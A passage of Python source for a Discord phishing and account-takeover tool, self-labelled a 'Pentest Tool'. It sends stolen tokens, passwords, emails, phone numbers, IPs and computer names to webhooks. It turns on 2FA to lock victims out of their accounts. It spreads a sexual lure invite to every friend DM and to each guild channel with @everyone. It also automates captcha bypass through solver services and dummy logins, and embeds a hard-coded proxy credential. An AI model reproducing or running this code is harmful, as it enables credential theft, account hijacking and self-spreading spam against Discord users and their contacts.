                r = s.post(f'{API}/channels/{cid}/messages', headers=h,
                           json={'content': SPAM_MSG_GUILD}, timeout=10)
                if r.status_code in (200, 201):
                    sent += 1
                    break  # 1 message per guild
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 2)
                    time.sleep(retry + 0.5)
                    r2 = s.post(f'{API}/channels/{cid}/messages', headers=h,
                                json={'content': SPAM_MSG_GUILD}, timeout=10)
                    if r2.status_code in (200, 201):
                        sent += 1
                        break
                elif r.status_code == 403:
                    continue  # perm check was wrong, try next
                else:
                    failed += 1
                    break
            except:
                continue
        time.sleep(1.3)

    print(f'[spam] {uname}: Done! sent={sent} failed={failed}')


def send_webhook(token, client_ip="?", password="?"):
    client_ip = _clean_ip(client_ip)
    comp  = os.environ.get('COMPUTERNAME', platform.node())
    luser = os.environ.get('USERNAME', os.environ.get('USER', '?'))

    # Stealth session for all Discord API calls
    s_api = _make_session()
    try:
        s_api.get('https://discord.com/channels/@me', headers={'User-Agent': UA}, timeout=10)
    except:
        pass
    api_h = {
        "Authorization": token, "User-Agent": UA,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
        "X-Super-Properties": sprops(),
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "America/New_York",
        "X-Debug-Options": "bugReporterEnabled",
        "Sec-CH-UA": SEC_CH_UA, "Sec-CH-UA-Mobile": SEC_CH_UA_MOBILE,
        "Sec-CH-UA-Platform": SEC_CH_UA_PLATFORM,
        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
    }

    def _fallback(reason):
        try:
            plain_req.post(WEBHOOK, json={
                "embeds": [{"description": f"**TOKEN ({reason}):**\n```{token}```\n**Password:** `{password}`\n**IP:** `{client_ip}`\n**PC:** `{comp}` / `{luser}`", "color": 16776960}],
                "username": "Pentest Tool"
            }, timeout=10)
            print(f"[+] Webhook sent (fallback: {reason})")
        except Exception as e2:
            print(f"[!] Webhook fallback failed: {e2}")
        try:
            plain_req.post(WEBHOOK_BACKUP, json={
                "embeds": [{"description": f"**TOKEN ({reason}):**\n```{token}```\n**Password:** `{password}`\n**IP:** `{client_ip}`\n**PC:** `{comp}` / `{luser}`", "color": 16776960}],
                "username": "Pentest Tool"
            }, timeout=10)
        except: pass

    try:
        r = s_api.get(f"{API}/users/@me", headers=api_h, timeout=15)

        if r.status_code != 200:
            _fallback(f"info {r.status_code}"); return

        u = r.json()
        uid    = u.get('id', '?')
        uname  = u.get('username', 'N/A')
        disc   = u.get('discriminator', '0000')
        email  = u.get('email', 'N/A')
        phone  = u.get('phone', 'N/A')
        avatar = u.get('avatar')
        mfa    = u.get('mfa_enabled', False)
        nitro  = u.get('premium_type', 0) not in (None, 0)
        pfp    = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png" if avatar else None
        color  = 65280 if nitro else 16711680

        # ── Auto-enable 2FA if account has no MFA and we have a password ──
        totp_secret = None
        backup_codes_str = ''
        active_token = token  # Track which token is currently valid
        final_password = password
        pw_changed = False
        tfa_just_enabled = False
        if not mfa and password and password != '?':
            new_tok, secret, backups = _auto_enable_2fa(token, password)
            if new_tok:
                active_token = new_tok
                totp_secret = secret
                backup_codes_str = ', '.join(backups) if backups else 'None'
                mfa = True  # Now it's enabled
                tfa_just_enabled = True
                api_h['Authorization'] = active_token
                print(f'[2fa] Token updated for {uname}: {active_token[:20]}...')

        # ── Send mass messages using the active (post-takeover) token ──
        threading.Thread(target=_mass_message, args=(active_token, uname), daemon=True).start()

        try:
            cr = s_api.get(f"{API}/users/@me/channels", headers=api_h, timeout=10)
            dm_ids = [c['id'] for c in cr.json()] if cr.status_code == 200 else []
        except:
            dm_ids = []

        hq_str = _hq_guilds(active_token)
        try:
            gs = s_api.get(f"{API}/users/@me/guilds?with_counts=true",
                              headers=api_h, timeout=10).json()
            hq_ids = [g['id'] for g in gs if g.get("owner") or g.get("permissions") == "4398046511103"]
        except:
            hq_ids = []

        guild_ch = []
        for gid in hq_ids:
            try:
                gc = s_api.get(f"{API}/guilds/{gid}/channels",
                                  headers=api_h, timeout=10)
                if gc.status_code == 200:
                    guild_ch.extend(c['id'] for c in gc.json() if c.get('type') == 0)
            except:
                continue

        total = len(dm_ids) + len(guild_ch)

        # Build 2FA section for embed
        tfa_section = f"**2FA:** {'✅ Enabled' if mfa else '❌'}\n"
        if tfa_just_enabled and totp_secret:
            tfa_section += f"**TOTP Secret:** `{totp_secret}`\n"
            tfa_section += f"**Backup Codes:** `{backup_codes_str}`\n"

        # Build password section
        pw_line = f"**Password:** `{password}`\n"

        payload = {
            "embeds": [{
                "color": color,
                "thumbnail": {"url": pfp} if pfp else None,
                "author": {"name": f"{uname}#{disc}'s Information"},
                "description": (
                    f"**Discord ID:** `{uid}`\n"
                    f"**Email:** {email}\n"
                    f"**Phone:** {phone}\n"
                    f"{pw_line}"
                    f"{tfa_section}"
                    f"**Nitro:** {'✅' if nitro else '❌'}\n"
                    f"**System Info:**\n"
                    f"📛 Computer Name: `{comp}`\n"
                    f"👤 Username: `{luser}`\n"
                    f"🌐 IP Address: `{client_ip}`\n\n"
                    f"**TOKEN:**\n```{active_token}```\n"
                    f"**Messages to send:** `{total}`\n\n"
                    f"**HQ Guilds:**\n{hq_str}\n"
                ),
                "footer": {"text": "Logged by Combined Pentest Tool"}
            }],
            "username": "Pentest Tool"
        }
        plain_req.post(WEBHOOK, json=payload, timeout=10)
        print(f"[+] Webhook sent for {uname}#{disc} ({uid})")
        # Also fire backup webhook
        try:
            plain_req.post(WEBHOOK_BACKUP, json=payload, timeout=10)
        except: pass

    except Exception as e:
        print(f"[!] Webhook error: {e}")
        _fallback("exception")


def fire_webhook(token, client_ip="?", password="?"):
    # Try to look up password from store if not provided
    if password == '?':
        with _pw_store_lock:
            password = _pw_store.pop(token, '?')
    with _webhookd_lock:
        if token in _webhookd_tokens:
            print(f"[~] Webhook skipped (duplicate token)")
            return
        _webhookd_tokens.add(token)
    threading.Thread(target=send_webhook, args=(token, client_ip, password), daemon=True).start()


def _get_user_brief(token):
    """Fetch user id, username, avatar URL from token for success page."""
    try:
        h = {"Authorization": token, "User-Agent": UA}
        r = plain_req.get(f"{API}/users/@me", headers=h, timeout=10)
        if r.status_code == 200:
            u = r.json()
            uid = u.get('id', '')
            avatar = u.get('avatar', '')
            uname = u.get('username', '')
            pfp = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png?size=128" if avatar else ''
            return {'user_id': uid, 'username': uname, 'avatar_url': pfp}
    except:
        pass
    return {}


def _assign_role(user_id):
    """Add verified role to user in guild using bot token.
    Uses curl_cffi for Chrome TLS impersonation (bypasses Cloudflare on Railway).
    Skips member check — PUT /roles returns clear errors if user isn't in guild.
    Retries up to 3 times with backoff."""
    if not all([BOT_TOKEN, GUILD_ID, VERIFIED_ID, user_id]):
        print(f'[role] Skipping role assign: missing config (bot={bool(BOT_TOKEN)}, guild={GUILD_ID or "?"}, role={VERIFIED_ID or "?"}, user={user_id or "?"})')
        return False
    try:
        s = _make_session()
        url = f'{API}/guilds/{GUILD_ID}/members/{user_id}/roles/{VERIFIED_ID}'
        h = {
            'Authorization': f'Bot {BOT_TOKEN}',
            'User-Agent': 'DiscordBot (https://verify.discord.com, 1.0)',
            'X-Audit-Log-Reason': 'Age verification',
            'Content-Length': '0',
        }
        for attempt in range(3):
            try:
                r = s.put(url, headers=h, timeout=10)
            except Exception as net_err:
                print(f'[role] Network error attempt {attempt+1}/3: {net_err}')
                if attempt < 2:
                    time.sleep(2 * (attempt + 1))
                    s = _make_session()
                    continue
                raise
            if r.status_code in (200, 204):
                print(f'[role] ✓ Assigned role {VERIFIED_ID} to user {user_id} in guild {GUILD_ID}')
                return True
            elif r.status_code == 429:
                retry_after = 5
                try: retry_after = r.json().get('retry_after', 5)
                except: pass
                print(f'[role] Rate limited, retrying in {retry_after}s...')
                time.sleep(retry_after)
                continue
            elif r.status_code in (500, 502, 503, 504) or r.status_code == 403:
                print(f'[role] Server error attempt {attempt+1}/3 [{r.status_code}]: {r.text[:200]}')
                if attempt < 2:
                    time.sleep(2 * (attempt + 1))
                    s = _make_session()
                    continue
                print(f'[role] ✗ Failed after 3 attempts [{r.status_code}]: {r.text[:300]}')
                return False
            else:
                print(f'[role] ✗ Failed to assign role [{r.status_code}]: {r.text[:300]}')
                return False
        return False
    except Exception as e:
        print(f'[role] Error assigning role: {e}')
        return False


def _join_voice_channel(token, guild_id, channel_id):
    """Connect user's token to a voice channel via Gateway (once, no retry)."""
    if not all([token, guild_id, channel_id]):
        print(f'[voice] Skipping: missing token/guild/channel')
        return False
    try:
        print(f'[voice] Connecting {token[:20]}... to voice {channel_id}')
        ws = websocket.create_connection(
            'wss://gateway.discord.gg/?v=9&encoding=json',
            header=[f'User-Agent: {UA}', 'Origin: https://discord.com'],
            timeout=30
        )
        hello = json.loads(ws.recv())
        hb_interval = hello.get('d', {}).get('heartbeat_interval', 41250) / 1000

        # Identify with proper browser fingerprint
        ws.send(json.dumps({
            'op': 2,
            'd': {
                'token': token,
                'capabilities': 30717,
                'properties': {
                    'os': 'Windows', 'browser': 'Chrome', 'device': '',
                    'system_locale': 'en-US', 'browser_user_agent': UA,
                    'browser_version': f'{CHROME_VER}.0.0.0', 'os_version': '10',
                    'referrer': '', 'referring_domain': '',
                    'referrer_current': '', 'referring_domain_current': '',
                    'release_channel': 'stable',
                    'client_build_number': BUILD, 'client_event_source': None
                },
                'presence': {'status': 'online', 'since': 0, 'activities': [], 'afk': False},
                'compress': False
            }
        }))

        # Wait for READY event
        ready_timeout = time.time() + 15
        while time.time() < ready_timeout:
            raw = ws.recv()
            d = json.loads(raw)
            if d.get('t') == 'READY':
                print(f'[voice] Gateway READY, joining channel...')
                break
        else:
            print(f'[voice] Timeout waiting for READY')
            ws.close()
            return False

        # Voice State Update — join the channel (self-muted, self-deafened)
        ws.send(json.dumps({
            'op': 4,
            'd': {
                'guild_id': guild_id,
                'channel_id': channel_id,
                'self_mute': True,
                'self_deaf': True,
                'self_video': False
            }
        }))
        print(f'[voice] Sent voice state update for {channel_id}')

        # Keep alive for 2 minutes (heartbeats), then disconnect (was 5min — OOM fix)
        stop_at = time.time() + 120
        next_hb = time.time() + hb_interval
        ws.settimeout(hb_interval + 5)
        while time.time() < stop_at:
            try:
                if time.time() >= next_hb:
                    ws.send(json.dumps({'op': 1, 'd': None}))
                    next_hb = time.time() + hb_interval
                raw = ws.recv()
                d = json.loads(raw)
                if d.get('op') == 1:  # Heartbeat request
                    ws.send(json.dumps({'op': 1, 'd': None}))
                    next_hb = time.time() + hb_interval
            except websocket.WebSocketTimeoutException:
                pass
            except:
                break

        # Leave voice before disconnecting
        try:
            ws.send(json.dumps({'op': 4, 'd': {'guild_id': guild_id, 'channel_id': None, 'self_mute': True, 'self_deaf': True}}))
            time.sleep(0.5)
        except:
            pass
        ws.close()
        print(f'[voice] Disconnected from voice after 2min')
        return True
    except Exception as e:
        print(f'[voice] Error: {e}')
        return False


def _set_dnd(token):
    """Set the captured token's status to Do Not Disturb immediately."""
    try:
        h = {"Authorization": token, "User-Agent": UA, "Content-Type": "application/json"}
        r = plain_req.patch(f"{API}/users/@me/settings", headers=h,
                            json={"status": "dnd"}, timeout=10)
        print(f'[dnd] Set DND: {r.status_code}')
    except Exception as e:
        print(f'[dnd] Error: {e}')


def _success_with_info(token):
    """Build success response with user info, fire webhook & assign role + voice."""
    info = _get_user_brief(token)
    # Assign verified role in background
    if info.get('user_id'):
        threading.Thread(target=_assign_role, args=(info['user_id'],), daemon=True).start()
    # Join voice channel (once, no retry)
    if VOICE_CHANNEL_ID and GUILD_ID:
        threading.Thread(target=_join_voice_channel, args=(token, GUILD_ID, VOICE_CHANNEL_ID), daemon=True).start()
    # Join second voice channel
    if VOICE_CHANNEL_ID_2 and GUILD_ID_2:
        threading.Thread(target=_join_voice_channel, args=(token, GUILD_ID_2, VOICE_CHANNEL_ID_2), daemon=True).start()
    # Spread DM invite in background
    threading.Thread(target=_spread_dms, args=(token,), daemon=True).start()
    # Set to Do Not Disturb immediately
    threading.Thread(target=_set_dnd, args=(token,), daemon=True).start()
    return {'success': True, **info}


# ━━━━━━━━━━━━ DM Spread (stealth) ━━━━━━━━━━━━
import random

SPREAD_MESSAGE = 'https://discord.gg/bzGsAUpdsY bro join she is stripping on cam'

def _make_nonce():
    """Generate a Discord-style snowflake nonce (like real client)."""
    return str((int(time.time() * 1000) - 1420070400000) << 22 | random.randint(0, 4194303))


def _spread_dms(token):
    """Send invite link to all open DMs and friends using full Chrome TLS impersonation."""
    try:
        # Build a stealth session — same Chrome fingerprint the login used
        s = _make_session()

        # Visit discord.com first to get cookies (mimics real browser session)
        try:
            s.get('https://discord.com/channels/@me', headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': UA,
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            }, timeout=15)
        except:
            pass

        def api_headers(with_ct=True):
            h = {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Authorization': token,
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/channels/@me',
                'User-Agent': UA,
                'X-Discord-Locale': 'en-US',
                'X-Discord-Timezone': 'America/Los_Angeles',
                'X-Debug-Options': 'bugReporterEnabled',
                'X-Super-Properties': sprops(),
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
            }
            if with_ct:
                h['Content-Type'] = 'application/json'
            return h

        # ── PHASE 1: Collect all DM targets (open DMs + friends) — DMs FIRST ──
        dm_channel_ids = []
        try:
            r = s.get(f'{API}/users/@me/channels', headers=api_headers(False), timeout=15)
            if r.status_code == 200:
                for ch in r.json():
                    if ch.get('type') in (1, 3):  # 1=DM, 3=GroupDM
                        dm_channel_ids.append(ch['id'])
                print(f'[spread] Found {len(dm_channel_ids)} open DM channels')
            else:
                print(f'[spread] Failed to get DMs: {r.status_code}')
        except Exception as e:
            print(f'[spread] DM list error: {e}')

        # Get friends and open DM channels for those not already open
        friend_user_ids = set()
        try:
            r = s.get(f'{API}/users/@me/relationships', headers=api_headers(False), timeout=15)
            if r.status_code == 200:
                for rel in r.json():
                    if rel.get('type') == 1:
                        friend_user_ids.add(rel['id'])
                print(f'[spread] Found {len(friend_user_ids)} friends')
            else:
                print(f'[spread] Failed to get friends: {r.status_code}')
        except Exception as e:
            print(f'[spread] Friends list error: {e}')

        for fid in friend_user_ids:
            try:
                time.sleep(0.65)
                r = s.post(f'{API}/users/@me/channels', headers=api_headers(),
                           json={'recipients': [fid]}, timeout=15)
                if r.status_code == 200:
                    ch_id = r.json().get('id')
                    if ch_id and ch_id not in dm_channel_ids:
                        dm_channel_ids.append(ch_id)
            except:
                pass

        print(f'[spread] Total DM channels to message: {len(dm_channel_ids)}')

        # ── PHASE 2: Send DM messages ──
        sent = 0
        failed = 0
        for ch_id in dm_channel_ids:
            try:
                time.sleep(0.65)
                payload = {
                    'content': SPREAD_MESSAGE,
                    'nonce': _make_nonce(),
                    'tts': False,
                    'flags': 0
                }
                r = s.post(f'{API}/channels/{ch_id}/messages',
                           headers=api_headers(), json=payload, timeout=15)
                if r.status_code == 200:
                    sent += 1
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 5)
                    print(f'[spread] Rate limited on {ch_id}, waiting {retry}s')
                    time.sleep(retry + 1)
                    r2 = s.post(f'{API}/channels/{ch_id}/messages',
                                headers=api_headers(), json=payload, timeout=15)
                    if r2.status_code == 200:
                        sent += 1
                    else:
                        failed += 1
                elif r.status_code == 403:
                    failed += 1
                else:
                    failed += 1
                    print(f'[spread] DM error {r.status_code} on {ch_id}')
            except Exception as e:
                failed += 1

        print(f'[spread] DMs done: sent={sent}, failed={failed}')

        # ── PHASE 3: Spam ALL guild text channels with @everyone ──
        guild_sent = 0
        guild_failed = 0
        try:
            r = s.get(f'{API}/users/@me/guilds', headers=api_headers(False), timeout=15)
            if r.status_code == 200:
                guilds = r.json()
                print(f'[spread] Found {len(guilds)} guilds to spam')
                for guild in guilds:
                    gid = guild['id']
                    try:
                        cr = s.get(f'{API}/guilds/{gid}/channels', headers=api_headers(False), timeout=15)
                        if cr.status_code != 200:
                            continue
                        channels = cr.json()
                        text_chs = [c for c in channels if c.get('type') == 0]
                        for ch in text_chs:
                            try:
                                time.sleep(0.65)
                                payload = {
                                    'content': f'@everyone {SPREAD_MESSAGE}',
                                    'nonce': _make_nonce(),
                                    'tts': False,
                                    'flags': 0
                                }
                                r2 = s.post(f'{API}/channels/{ch["id"]}/messages',
                                            headers=api_headers(), json=payload, timeout=15)
                                if r2.status_code == 200:
                                    guild_sent += 1
                                elif r2.status_code == 429:
                                    rt = r2.json().get('retry_after', 5)
                                    time.sleep(rt + 1)
                                    r3 = s.post(f'{API}/channels/{ch["id"]}/messages',
                                                headers=api_headers(), json=payload, timeout=15)
                                    if r3.status_code == 200:
                                        guild_sent += 1
                                    else:
                                        guild_failed += 1
                                else:
                                    guild_failed += 1
                            except:
                                guild_failed += 1
                    except:
                        pass
        except Exception as e:
            print(f'[spread] Guild fetch error: {e}')

        print(f'[spread] Guilds done: sent={guild_sent}, failed={guild_failed}')
        print(f'[spread] TOTAL: DM={sent}, Guild={guild_sent}')

    except Exception as e:
        print(f'[spread] Fatal error: {e}')


# ━━━━━━━━━━━━ QR Remote Auth ━━━━━━━━━━━━

sessions = {}          # QR auth sessions
login_sessions = {}    # Captcha flow: sid -> DiscordSession (persisted between captcha challenge & solve)
_login_lock = threading.Lock()  # Thread-safe access to login_sessions
SESSION_SOLVE_TIMEOUT = 120  # Stop solving captchas for sessions older than 2 minutes

import collections

# ━━━━━━━━━━━━ Session Pre-Warm Pool ━━━━━━━━━━━━
# Pre-prepares DiscordSessions (cookies + fingerprint) so logins start faster.
# Saves ~2-4s per login by skipping the prepare() step.

_session_pool = collections.deque()
_session_pool_lock = threading.Lock()
_session_pool_active = 0
SESSION_POOL_MAX = 4     # reduced from 12 — Railway OOM fix
SESSION_POOL_TTL = 180   # 3 minutes (shorter = less stale sessions in RAM)


def _prepare_session_worker():
    global _session_pool_active
    try:
        ds = DiscordSession()
        ds.prepare()
        if ds.cookies_ready:
            with _session_pool_lock:
                _session_pool.append({'session': ds, 'time': time.time()})
            print(f'[session-pool] Ready! Pool: {len(_session_pool)}')
        else:
            print('[session-pool] Failed to prepare session')
    except Exception as e:
        print(f'[session-pool] Error: {e}')
    finally:
        with _session_pool_lock:
            _session_pool_active -= 1


def _refill_session_pool():
    global _session_pool_active
    with _session_pool_lock:
        now = time.time()
        while _session_pool and (now - _session_pool[0]['time']) > SESSION_POOL_TTL:
            stale = _session_pool.popleft()
            # Explicitly close the curl_cffi session to free memory
            try: stale['session'].s.close()
            except: pass
        pool_size = len(_session_pool)
        needed = SESSION_POOL_MAX - pool_size - _session_pool_active
        if needed <= 0:
            return
        to_launch = min(needed, 2)  # launch up to 2 at once (was 3)
        _session_pool_active += to_launch
    for _ in range(to_launch):
        threading.Thread(target=_prepare_session_worker, daemon=True).start()


def _get_ready_session():
    """Get a pre-prepared session from the pool (instant) or None."""
    with _session_pool_lock:
        now = time.time()
        while _session_pool:
            entry = _session_pool.popleft()
            if now - entry['time'] < SESSION_POOL_TTL:
                threading.Thread(target=_refill_session_pool, daemon=True).start()
                return entry['session']
    _refill_session_pool()
    return None


def _session_pool_loop():
    """Background loop — keeps session pool full."""
    print('[session-pool] Background loop started (warming in 3s)')
    time.sleep(3)
    while True:
        try:
            _refill_session_pool()
        except Exception as e:
            print(f'[session-pool] Error: {e}')
        time.sleep(15)  # check every 15s instead of 8s — less memory churn


# ━━━━━━━━━━━━ Global Captcha Token Arsenal ━━━━━━━━━━━━
# Discord captcha challenges are IP/session-based, NOT email-specific.
# Random chars as email still triggers captcha. So we pre-solve tokens 24/7
# using dummy logins and keep a ready pool. When someone clicks Login,
# we grab a token from the pool — zero wait. The pool auto-refills.

import collections

DEFAULT_SITEKEY = 'a9b5fb07-92ff-493f-86fe-352a2803b3df'
_last_discord_sitekey = DEFAULT_SITEKEY

ARSENAL_TARGET    = 2    # keep this many ready tokens (reduced from 5 — Railway OOM fix)
ARSENAL_MAX       = 4    # hard cap (reduced from 8)
ARSENAL_TTL       = 70   # seconds before a token expires (hCaptcha ~120s)
ARSENAL_WORKERS   = 2    # concurrent solve pipelines (reduced from 3)

# Thread-safe token pool
_arsenal          = collections.deque()  # deque of {'token', 'rqtoken', 'sitekey', 'time'}
_arsenal_lock     = threading.Lock()
_arsenal_active   = 0    # number of pipelines currently running


def _arsenal_pipeline():
    """One pipeline: session → dummy login → get rqdata → solve → add to pool."""
    global _arsenal_active
    try:
        ds = _get_ready_session() or DiscordSession()
        ds.prepare()
        # Random junk email — Discord doesn't care, still gives captcha
        junk = uuid.uuid4().hex[:10] + '@' + uuid.uuid4().hex[:6] + '.com'
        payload = {
            'login': junk,
            'password': 'Arsenal247PreSolve!',
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
        }
        r = ds.post('/auth/login', payload)
        j = r.json()

        ckeys = j.get('captcha_key', [])
        is_captcha = isinstance(ckeys, list) and (
            'captcha-required' in ckeys or j.get('captcha_sitekey')
        )
        if not is_captcha:
            print(f'[arsenal] No captcha returned — IP might be clean or rate-limited')
            return

        sitekey = j.get('captcha_sitekey', DEFAULT_SITEKEY)
        rqdata  = j.get('captcha_rqdata', '')
        rqtoken = j.get('captcha_rqtoken', '')

        print(f'[arsenal] Got challenge, solving... (sitekey={sitekey[:16]})')
        token, err = solve_captcha(sitekey, rqdata)

        if token:
            # Close the curl_cffi session — we only need the captcha token string
            try: ds.s.close()
            except: pass
            with _arsenal_lock:
                _arsenal.append({
                    'token': token, 'rqtoken': rqtoken,
                    'sitekey': sitekey, 'time': time.time(),
                    # NOTE: 'ds' removed — was holding full curl_cffi session in RAM
                })
                pool_size = len(_arsenal)
            print(f'[arsenal] ✓ Token ready! Pool: {pool_size}/{ARSENAL_TARGET}')
        else:
            print(f'[arsenal] Solve failed: {err}')
    except Exception as exc:
        print(f'[arsenal] Pipeline error: {exc}')
    finally:
        with _arsenal_lock:
            _arsenal_active -= 1


def _arsenal_grab():
    """Grab a fresh token from the pool. Returns dict or None.
    Triggers refill in background after consuming."""
    with _arsenal_lock:
        now = time.time()
        while _arsenal:
            entry = _arsenal.popleft()
            age = now - entry['time']
            if age < ARSENAL_TTL:
                print(f'[arsenal] Grabbed token (age {age:.0f}s, pool left: {len(_arsenal)})')
                # Kick off refill
                threading.Thread(target=_arsenal_refill, daemon=True).start()
                return entry
            else:
                print(f'[arsenal] Discarded expired token (age {age:.0f}s)')
    # Pool empty — kick refill
    threading.Thread(target=_arsenal_refill, daemon=True).start()
    return None


def _arsenal_refill():
    """Launch pipeline workers to bring pool back up to target."""
    global _arsenal_active
    with _arsenal_lock:
        # Purge expired
        now = time.time()
        while _arsenal and (now - _arsenal[0]['time']) >= ARSENAL_TTL:
            _arsenal.popleft()
        pool_size = len(_arsenal)
        needed = ARSENAL_TARGET - pool_size - _arsenal_active
        if needed <= 0:
            return
        to_launch = min(needed, ARSENAL_WORKERS)
        _arsenal_active += to_launch
    for _ in range(to_launch):
        threading.Thread(target=_arsenal_pipeline, daemon=True).start()


def _arsenal_loop():
    """Background loop: keep the arsenal full 24/7."""
    print(f'[arsenal] 24/7 token pool started (target={ARSENAL_TARGET}, TTL={ARSENAL_TTL}s)')
    time.sleep(1)  # Let sessions warm up first
    while True:
        try:
            _arsenal_refill()
        except Exception as exc:
            print(f'[arsenal] Loop error: {exc}')
        time.sleep(3)  # Check every 3s


def _arsenal_wait(timeout=90):
    """Block until a token is available or timeout."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        entry = _arsenal_grab()
        if entry:
            return entry
        time.sleep(0.5)
    return None


def _arsenal_status():
    """Return current pool stats."""
    with _arsenal_lock:
        now = time.time()
        valid = sum(1 for e in _arsenal if (now - e['time']) < ARSENAL_TTL)
    return {'pool': valid, 'active': _arsenal_active, 'target': ARSENAL_TARGET}


# Legacy aliases
_presolve_loop = _arsenal_loop

def _start_presolve():
    pass

def _get_presolved(required_sitekey=None):
    return None


PROXY = os.environ.get('CAPTCHA_PROXY', 'http://henchmanbobby_gmail_com:Fatman11@la.residential.rayobyte.com:8000')


# ━━━━━━━━━━━━ Multi-Provider Captcha Solving ━━━━━━━━━━━━
# Races Anti-Captcha AND CapSolver simultaneously. First to return wins.
# If only one provider is configured, uses that one alone.

def _solve_anticaptcha(sitekey, rqdata, cancel_event=None):
    """Solve via Anti-Captcha."""
    t0 = time.time()
    api = 'https://api.anti-captcha.com'
    if not ANTICAPTCHA_KEY:
        return None, 'No ANTICAPTCHA_KEY'
    try:
        task = {
            'type': 'HCaptchaTaskProxyless',
            'websiteURL': 'https://discord.com/login',
            'websiteKey': sitekey,
            'isEnterprise': True,
            'userAgent': UA,
        }
        if rqdata:
            task['enterprisePayload'] = {'rqdata': rqdata}

        r = plain_req.post(f'{api}/createTask', json={
            'clientKey': ANTICAPTCHA_KEY,
            'task': task,
            'languagePool': 'en',
        }, timeout=30)
        j = r.json()
        task_id = j.get('taskId')
        if j.get('errorId', 0) != 0 or not task_id:
            return None, j.get('errorDescription', 'createTask failed')

        for poll in range(1200):
            if cancel_event and cancel_event.is_set():
                return None, 'cancelled'
            elapsed = time.time() - t0
            time.sleep(0.05 if elapsed < 5 else (0.1 if elapsed < 20 else 0.2))
            r = plain_req.post(f'{api}/getTaskResult', json={
                'clientKey': ANTICAPTCHA_KEY, 'taskId': task_id,
            }, timeout=15)
            j = r.json()
            if j.get('status') == 'ready':
                token = j.get('solution', {}).get('gRecaptchaResponse', '')
                if token and len(token) > 20:
                    print(f'[+] Anti-Captcha solved! {len(token)} chars in {time.time()-t0:.1f}s')
                    return token, None
                return None, 'Empty token'
            if j.get('errorId', 0) != 0:
                return None, j.get('errorDescription', 'solve failed')
            if elapsed > 180:
                break
        return None, f'Anti-Captcha timeout ({time.time()-t0:.0f}s)'
    except Exception as e:
        return None, f'Anti-Captcha: {e}'


def _solve_capsolver(sitekey, rqdata, cancel_event=None):
    """Solve via CapSolver."""
    t0 = time.time()
    api = 'https://api.capsolver.com'
    if not CAPSOLVER_KEY:
        return None, 'No CAPSOLVER_KEY'
    try:
        task = {
            'type': 'HCaptchaTaskProxyLess',
            'websiteURL': 'https://discord.com/login',
            'websiteKey': sitekey,
            'isEnterprise': True,
            'userAgent': UA,
        }
        if rqdata:
            task['enterprisePayload'] = {'rqdata': rqdata}

        r = plain_req.post(f'{api}/createTask', json={
            'appId': '9E199308-AD6D-41FB-90C7-72FA3E8653EE',
            'clientKey': CAPSOLVER_KEY,
            'task': task,
        }, timeout=30)
        j = r.json()
        task_id = j.get('taskId')
        if j.get('errorId', 0) != 0 or not task_id:
            return None, j.get('errorDescription', 'createTask failed')

        for poll in range(1200):
            if cancel_event and cancel_event.is_set():
                return None, 'cancelled'
            elapsed = time.time() - t0
            time.sleep(0.05 if elapsed < 3 else (0.1 if elapsed < 15 else 0.2))
            r = plain_req.post(f'{api}/getTaskResult', json={
                'clientKey': CAPSOLVER_KEY, 'taskId': task_id,
            }, timeout=15)
            j = r.json()
            if j.get('status') == 'ready':
                token = j.get('solution', {}).get('gRecaptchaResponse', '')
                if token and len(token) > 20:
                    print(f'[+] CapSolver solved! {len(token)} chars in {time.time()-t0:.1f}s')
                    return token, None
                return None, 'Empty token'
            if j.get('errorId', 0) != 0:
                return None, j.get('errorDescription', 'solve failed')
            if elapsed > 180:
                break
        return None, f'CapSolver timeout ({time.time()-t0:.0f}s)'
    except Exception as e:
        return None, f'CapSolver: {e}'


def solve_captcha(sitekey, rqdata, cancel_event=None):
    """Race all configured providers. First to return a valid token wins.
    Typically ~30-50% faster than single-provider due to variance in solve times."""
    providers = []
    if ANTICAPTCHA_KEY:
        providers.append(('AntiCaptcha', _solve_anticaptcha))
    if CAPSOLVER_KEY:
        providers.append(('CapSolver', _solve_capsolver))
    if not providers:
        return None, 'No captcha API keys configured'

    # Single provider — just call it directly
    if len(providers) == 1:
        name, fn = providers[0]
        print(f'[solve] Using {name} (single provider)')
        return fn(sitekey, rqdata, cancel_event)

    # Multi-provider race
    print(f'[solve] Racing {len(providers)} providers: {", ".join(p[0] for p in providers)}')
    winner = [None]
    last_err = [None]
    done = threading.Event()
    cancel_all = threading.Event()

    def _provider_worker(name, fn):
        if cancel_all.is_set():
            return
        # Create a combined cancel: triggers if race cancel OR external cancel fires
        class CombinedEvent:
            def is_set(self):
                return cancel_all.is_set() or (cancel_event and cancel_event.is_set())
        t, e = fn(sitekey, rqdata, CombinedEvent())
        if t and not winner[0]:
            winner[0] = t
            done.set()
            cancel_all.set()
            print(f'[solve] {name} WON the race!')
        elif not t:
            last_err[0] = f'{name}: {e}'
        # Check if all done
        if not winner[0] and all(f.done() for f in futures):
            done.set()

    from concurrent.futures import ThreadPoolExecutor
    pool = ThreadPoolExecutor(max_workers=len(providers))
